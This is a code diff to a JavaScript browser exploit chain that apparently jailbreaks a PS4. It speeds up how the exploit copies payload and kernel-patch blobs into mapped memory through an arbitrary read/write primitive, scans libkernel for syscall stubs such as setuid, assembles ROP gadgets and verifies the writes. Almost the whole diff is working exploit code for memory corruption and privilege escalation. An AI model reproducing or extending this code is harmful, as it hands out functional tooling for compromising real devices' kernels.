@@ -1,5 +1,11 @@
 import { establishPrimitive } from "./core.js?v=10";
-import { installWindowP, pairStatus } from "./mem.js";
+import {
+  installWindowP,
+  pairStatus,
+  readInto,
+  writeFrom,
+  addrNumber,
+} from "./mem.js";
 import { int64 } from "./int64.js";
 import { offsetsFor } from "./ps4_offsets.js";
 
@@ -12,7 +18,12 @@ let armedEver = false;
 const params = new URLSearchParams(location.search);
 const STOP_BEFORE_DOUBLE = params.get("stop") === "beforedouble";
 
+// ?t=1 opts IN the fire-and-forget /t telemetry POSTs. On GitHub Pages the
+// endpoint 404s, so defaulting off keeps hundreds of useless XHRs out of
+// the timing-sensitive exploit phases on the PS4.
+const TELEMETRY = params.get("t") === "1";
 function post(tag, detail) {
+  if (!TELEMETRY) return;
   try {
     const x = new XMLHttpRequest();
     x.open("POST", "/t", true);
@@ -61,28 +72,35 @@ function finishUI(ok) {
         : "Refresh the page and run again";
   document.body.className = ok ? "done" : "fail";
 }
+let logRendered = 0;
+function classifyLine(l) {
+  if (/FAIL|ERROR|THREW|REBOOT|MISS|LOST|POISON|TIMEOUT|MISMATCH|ABORTED|GIVEUP|NO-STORAGE|UNSEEN/i.test(l))
+    return "bad";
+  if (/WARN|SKIP|REFUS|COMMITTED|DIRTY/i.test(l)) return "warn";
+  if (/\bOK\b|\bPASS\b|PASS=|ACHIEVED|RUNNING|ARMED/i.test(l)) return "ok";
+  return "";
+}
 function mark(tag, detail) {
   const raw = detail;
   detail = terse(detail);
   lines.push(tag + (detail == null || detail === "" ? "" : "  " + detail));
   if (SHOW_LOG && outEl) {
-    const esc = (t) => String(t).replace(/&/g, "&amp;").replace(/</g, "&lt;");
-    outEl.innerHTML = lines
-      .map(function (l) {
-        l = esc(l);
-        const c =
-          /FAIL|ERROR|THREW|REBOOT|MISS|LOST|POISON|TIMEOUT|MISMATCH|ABORTED|GIVEUP|NO-STORAGE|UNSEEN/i.test(
-            l,
-          )
-            ? "bad"
-            : /WARN|SKIP|REFUS|COMMITTED|DIRTY/i.test(l)
-              ? "warn"
-              : /\bOK\b|\bPASS\b|PASS=|ACHIEVED|RUNNING|ARMED/i.test(l)
-                ? "ok"
-                : "";
-        return c ? '<span class="' + c + '">' + l + "</span>" : l;
-      })
-      .join("\n");
+    // Append only the lines not already in the DOM. Rebuilding the whole
+    // log through innerHTML on every mark() was O(n^2) parse+layout work
+    // on the PS4, which visibly stalls long ?log=1 runs.
+    for (; logRendered < lines.length; logRendered++) {
+      const l = lines[logRendered];
+      const c = classifyLine(l);
+      if (c) {
+        const s = document.createElement("span");
+        s.className = c;
+        s.textContent = l;
+        outEl.appendChild(s);
+      } else {
+        outEl.appendChild(document.createTextNode(l));
+      }
+      outEl.appendChild(document.createTextNode("\n"));
+    }
     outEl.scrollTop = outEl.scrollHeight;
   }
   post(tag, raw);
@@ -106,6 +124,60 @@ function check(name, ok, detail) {
     mark("PROOF-FAIL", name + (detail ? "  " + detail : ""));
   }
   return ok;
+}
+
+// ---- windowed bulk transfers through the carrier window ----
+// Every p.read*/p.write* call pays a full aim/restore cycle, so moving a
+// 288 KB payload one qword at a time costs ~37k write8 cycles plus ~295k
+// read1 verify cycles on the PS4's slow core, each with fresh int64
+// allocations. readInto/writeFrom move one carrier window (0x100 bytes)
+// per cycle instead -- identical bytes at identical addresses, ~250x
+// fewer aim/restore cycles, and near-zero garbage for the GC.
+const WIN_BYTES = 0x100;
+const winBuf = new Uint8Array(WIN_BYTES);
+const scanWin = new Uint8Array(WIN_BYTES);
+
+// Copies blob to addr through the carrier window and verifies it back.
+// Returns the first mismatching byte offset, or -1 when it landed clean.
+function copyBlobWindow(blob, addr) {
+  writeFrom(blob, addr, blob.length);
+  const base = addrNumber(addr);
+  let done = 0;
+  while (done < blob.length) {
+    const chunk = Math.min(blob.length - done, WIN_BYTES);
+    readInto(winBuf, base + done, chunk);
+    for (let i = 0; i < chunk; ++i)
+      if (winBuf[i] !== blob[done + i]) return done + i;
+    done += chunk;
+  }
+  return -1;
+}
+
+// Scans limit bytes at 16-byte stride for libkernel syscall stubs
+// (48 c7 c0 <imm32> ... 49). visit(num, offset) returns true to stop.
+// One carrier window covers 16 candidates instead of one read8 each.
+function scanStubs(baseNum, limit, visit) {
+  for (let w = 0; w < limit; w += WIN_BYTES) {
+    const chunk = Math.min(limit - w, WIN_BYTES);
+    readInto(scanWin, baseNum + w, chunk);
+    const b = scanWin;
+    for (let o = 0; o + 8 <= chunk; o += 16) {
+      if (b[o] !== 0x48 || b[o + 1] !== 0xc7 || b[o + 2] !== 0xc0)
+        continue;
+      if (b[o + 7] !== 0x49) continue;
+      if (
+        visit(
+          (b[o + 3] |
+            (b[o + 4] << 8) |
+            (b[o + 5] << 16) |
+            (b[o + 6] << 24)) >>>
+            0,
+          w + o,
+        )
+      )
+        return;
+    }
+  }
 }
 
 const SYS = {
@@ -345,6 +417,20 @@ let allDone = false,
     )
       return;
 
+    function findStub(num) {
+      let found = null;
+      scanStubs(
+        addrNumber(libkernelBase),
+        off.k_scan_stage1,
+        function (n, o) {
+          if (n !== num) return false;
+          found = libkernelBase.add32(o);
+          return true;
+        },
+      );
+      return found;
+    }
+
     const G = {};
     const GAD = [
       ["POP_RDI_RET", off.wk_POP_RDI_RET, [0x5f, 0xc3]],
@@ -424,15 +510,17 @@ let allDone = false,
         .filter((n) => !stubAddr.has(n)),
     );
     let scanned = 0;
-    for (let o = 0; o < off.k_scan_stage1 && need.size; o += 16) {
-      const v = p.read8(libkernelBase.add32(o));
-      if ((v.low & 0x00ffffff) !== 0xc0c748 || v.hi >>> 24 !== 0x49) continue;
-      const num = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
-      if (!need.has(num)) continue;
-      stubAddr.set(num, libkernelBase.add32(o));
-      need.delete(num);
-      scanned++;
-    }
+    scanStubs(
+      addrNumber(libkernelBase),
+      off.k_scan_stage1,
+      function (num, o) {
+        if (!need.has(num)) return false;
+        stubAddr.set(num, libkernelBase.add32(o));
+        need.delete(num);
+        scanned++;
+        return need.size === 0;
+      },
+    );
     mark("STUBS", "seeded=" + seeded + " scanned=" + scanned);
     const miss = Object.keys(SYS).filter((k) => !stubAddr.has(SYS[k]));
     if (!check("syscall-page-needs-stub", miss.length === 0, miss.join(",")))
@@ -557,16 +645,7 @@ let allDone = false,
         mark("JB-RELAUNCH", "mmap failed err=" + errno());
         return;
       }
-      for (let o = 0; o < blob.length; o += 8) {
-        let lo = 0,
-          hi = 0;
-        for (let k = 0; k < 4; k++) lo |= (blob[o + k] || 0) << (8 * k);
-        for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << (8 * k);
-        p.write8(entry.add32(o), new int64(lo >>> 0, hi >>> 0));
-      }
-      let bad = -1;
-      for (let o = 0; o < blob.length && bad < 0; o++)
-        if (p.read1(entry.add32(o)) !== blob[o]) bad = o;
+      const bad = copyBlobWindow(blob, entry);
       if (bad >= 0) {
         mark("JB-RELAUNCH", "copy MISMATCH@0x" + bad.toString(16));
         return;
@@ -607,19 +686,10 @@ let allDone = false,
 
     if (SKIPJB) {
       const SETUID = 23;
-      if (!stubAddr.has(SETUID))
-        for (let o = 0; o < off.k_scan_stage1; o += 16) {
-          const v = p.read8(libkernelBase.add32(o));
-          if ((v.low & 0x00ffffff) !== 0xc0c748 || v.hi >>> 24 !== 0x49)
-            continue;
-          if (
-            ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0 ===
-            SETUID
-          ) {
-            stubAddr.set(SETUID, libkernelBase.add32(o));
-            break;
-          }
-        }
+      if (!stubAddr.has(SETUID)) {
+        const found = findStub(SETUID);
+        if (found) stubAddr.set(SETUID, found);
+      }
       if (!stubAddr.has(SETUID)) {
         mark("JB-PROBE", "stub=absent skip=impossible");
       } else {
@@ -2966,16 +3036,7 @@ let allDone = false,
                 },
               };
             }
-            function findStub(num) {
-              for (let o = 0; o < off.k_scan_stage1; o += 16) {
-                const v = p.read8(libkernelBase.add32(o));
-                if ((v.low & 0x00ffffff) !== 0xc0c748 || v.hi >>> 24 !== 0x49)
-                  continue;
-                if (((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0 === num)
-                  return libkernelBase.add32(o);
-              }
-              return null;
-            }
+            // findStub now lives once in the outer scope (windowed scan).
             const stSetuid = findStub(23),
               stGeteuid = findStub(25),
               stOpen = findStub(5);
@@ -3349,19 +3410,7 @@ let allDone = false,
                     "jitFd=" + jitFd + " jitErr=" + jitErr + " map=" + mapAddr,
                   )
                 ) {
-                  for (let o = 0; o < kpatchBlob.length; o += 8) {
-                    let lo = 0,
-                      hi = 0;
-                    for (let k = 0; k < 4; k++)
-                      lo |= (kpatchBlob[o + k] || 0) << (8 * k);
-                    for (let k = 0; k < 4; k++)
-                      hi |= (kpatchBlob[o + 4 + k] || 0) << (8 * k);
-                    p.write8(mapAddr.add32(o), new int64(lo >>> 0, hi >>> 0));
-                  }
-                  let copied = true;
-                  for (let o = 0; o < kpatchBlob.length && copied; o++)
-                    if (p.read1(mapAddr.add32(o)) !== kpatchBlob[o])
-                      copied = false;
+                  const copied = copyBlobWindow(kpatchBlob, mapAddr) < 0;
                   mark(
                     "KPATCH-COPY",
                     "bytes=" +
@@ -3493,18 +3542,7 @@ let allDone = false,
                   "map=" + entry + " err=" + mErr,
                 )
               ) {
-                for (let o = 0; o < payloadBlob.length; o += 8) {
-                  let lo = 0,
-                    hi = 0;
-                  for (let k = 0; k < 4; k++)
-                    lo |= (payloadBlob[o + k] || 0) << (8 * k);
-                  for (let k = 0; k < 4; k++)
-                    hi |= (payloadBlob[o + 4 + k] || 0) << (8 * k);
-                  p.write8(entry.add32(o), new int64(lo >>> 0, hi >>> 0));
-                }
-                let bad = -1;
-                for (let o = 0; o < payloadBlob.length && bad < 0; o++)
-                  if (p.read1(entry.add32(o)) !== payloadBlob[o]) bad = o;
+                const bad = copyBlobWindow(payloadBlob, entry);
                 mark(
                   "PAYLOAD-COPY",
                   "bytes=" +
